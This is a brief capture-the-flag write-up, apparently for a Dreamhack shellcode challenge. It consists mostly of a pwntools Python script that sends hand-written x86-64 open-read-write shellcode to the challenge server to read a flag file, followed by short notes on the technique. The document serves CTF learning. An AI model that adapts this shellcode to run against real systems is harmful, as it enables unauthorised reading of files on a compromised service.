## Description

<img width="539" height="48" alt="image" src="https://github.com/user-attachments/assets/6284a975-5c64-4d30-ba59-c55549df18be" />

That program that runs the shell code you entered is registered as a service and is working.  

## Exploit
```python
from pwn import *

context.log_level='debug'

r = remote('host3.dreamhack.games', 13133)

shellcode=asm('''
xor rax, rax
push rax

mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax


mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall
mov rdi, 1
mov rax, 0x1
syscall
''', arch='amd64', os='linux')
r.sendline(shellcode)

r.interactive()
```
- Fundamental orw shellcode
- Pusing 0 in stack -> indicating the end of the string.
- Setting architecture and os is important.
